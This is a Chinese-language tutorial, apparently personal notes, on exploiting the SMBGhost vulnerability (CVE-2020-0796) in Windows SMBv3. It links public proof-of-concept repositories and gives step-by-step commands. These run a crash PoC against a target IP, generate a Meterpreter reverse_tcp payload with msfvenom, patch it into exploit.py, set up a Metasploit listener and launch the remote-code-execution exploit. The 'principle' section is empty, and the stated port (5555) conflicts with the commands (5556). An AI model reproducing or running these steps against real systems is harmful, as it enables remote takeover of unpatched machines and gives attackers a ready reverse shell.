永痕之黑漏洞（CVE-2020-0796）
  1. POC(蓝屏) poc 观点验证脚本
  • https://github.com/eerykitty/CVE-2020-0796-PoC
  • 使用：
  • 在CVE-2020-0796-PoC文件夹中打开终端
  • pip install ntlm_au (pip 是 Python 包管理工具打开安装的压缩包) （install=安装 ntlm_au=压缩包）
  • ./CVE-2020-0796.py 192.168.30.134
  1. EXP(RCE) exp 漏洞利用脚本

https://github.com/chompie1337/SMBGhost_RCE_PoC

  • 在SMBGhost_RcE_PoC文件夹中打开终端
  • msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=kaliip LPORT=5556 -b ‘\x00’ -i 5 -f python > exploit （利用msfvenom 生成木马病毒 LHOST填写kali的ip地址 LPORT设置端口为5555 -i(编码次数为5) 生成python文件格式）
  1. 在kili终端使用vim编辑器
  • vim exploit (vim打开名为exploit文件) 回车
  • :%s/buf/USER_PAYLOAD （将buf文件替换成USER_PAYLOAD，完成后将exploit内容替换到exploit.py） (%s=文本替换)
  • :wq!(表示为强制保存退出) 回车
  1. 将exploit内容替换到exploit.py
  • 重新打开一个窗口配置msfconsole
  • msfconsole
  • use exploit/multi/handler (配置一个监听器)
  • set payload windows/x64/meterpreter/reverse_tcp
  • show options(展示需要配置的选项)
  • set lhost kali的ip (监听主机的ip地址)
  • set lport 5556（监听的端口）
  • run
  1. 运行刚修改后的exploit.py 文件
  • python exploit.py -ip 目标ip
  1. 原理 （注：不一定能运行成功 看脸)
